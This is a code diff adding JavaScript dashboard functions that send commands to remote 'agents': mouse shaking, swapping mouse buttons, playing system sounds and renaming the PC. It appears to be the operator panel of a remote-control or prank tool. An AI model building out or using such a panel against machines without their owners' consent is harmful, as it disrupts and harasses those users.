@@ -648,6 +648,153 @@ async function stopSpam() {
     }
 }
 
+// Mouse Shake
+async function startMouseShake() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'mouseshake',
+                action: 'start'
+            })
+        });
+        
+        showNotification('Mouse shake started', '✅');
+        commandCount++;
+        addLog('warning', 'Mouse shake started');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function stopMouseShake() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'mouseshake',
+                action: 'stop'
+            })
+        });
+        
+        showNotification('Mouse shake stopped', '✅');
+        commandCount++;
+        addLog('success', 'Mouse shake stopped');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Swap Mouse Buttons
+async function swapMouse() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'swapmouse',
+                action: 'swap'
+            })
+        });
+        
+        showNotification('Mouse buttons swapped', '✅');
+        commandCount++;
+        addLog('warning', 'Mouse buttons swapped');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function restoreMouse() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'swapmouse',
+                action: 'restore'
+            })
+        });
+        
+        showNotification('Mouse buttons restored', '✅');
+        commandCount++;
+        addLog('success', 'Mouse buttons restored');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Play System Sound
+async function playSound(soundType) {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'systemsound',
+                sound: soundType
+            })
+        });
+        
+        showNotification(`${soundType} sound played`, '✅');
+        commandCount++;
+        addLog('success', `System sound: ${soundType}`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Rename PC
+async function renamePCFunc() {
+    if (!currentAgent) return;
+    
+    const newName = document.getElementById('newPCName').value.trim();
+    
+    if (!newName) {
+        showNotification('Please enter a new PC name', '⚠️');
+        return;
+    }
+    
+    showConfirm(`Rename PC to "${newName}"? (Restart required)`, async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'renamepc',
+                    name: newName
+                })
+            });
+            
+            showNotification(`PC will be renamed to: ${newName}`, '✅');
+            commandCount++;
+            addLog('warning', `PC rename requested: ${newName}`);
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
 // Command history
 function addCommandToHistory(type, command, result) {
     const historyList = document.getElementById('historyList');
